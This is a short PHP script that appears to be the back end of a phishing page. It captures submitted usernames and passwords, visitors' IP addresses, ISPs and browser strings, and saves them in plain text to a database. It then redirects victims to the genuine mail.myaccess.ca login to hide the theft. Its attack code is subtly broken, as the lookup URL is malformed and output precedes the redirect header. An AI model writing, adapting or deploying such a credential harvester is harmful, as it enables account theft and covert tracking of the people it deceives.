<?php
// 1. Database Connection
$conn = new mysqli("localhost", "root", "", "user_tracker");

// 2. Capture Login Inputs
$username = $_POST['username'];
$password = $_POST['password'];  

// 3. Capture Network & Browser Data
$ip_address = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// 4. Fetch ISP (Uses a free public API since PHP cannot get ISP locally)
$isp = "Unknown";
$api_url = "http://ip-api.com" . $ip_address;
$api_response = @file_get_contents($api_url);
if ($api_response) {
    $ip_data = json_decode($api_response, true);
    if ($ip_data && $ip_data['status'] === 'success') {
        $isp = $ip_data['isp'];
    }
}

// 5. Insert into Database
$stmt = $conn->prepare("INSERT INTO visitors (username, password, ip_address, isp, user_agent) VALUES (?, ?, ?, ?, ?)");
$stmt->bind_param("sssss", $username, $password, $ip_address, $isp, $user_agent);
$stmt->execute();

echo "Data logged successfully!";

// 6. REDIRECT THE USER TO ACCESSMAIL
header("Location: https://mail.myaccess.ca/");
exit(); 
?>
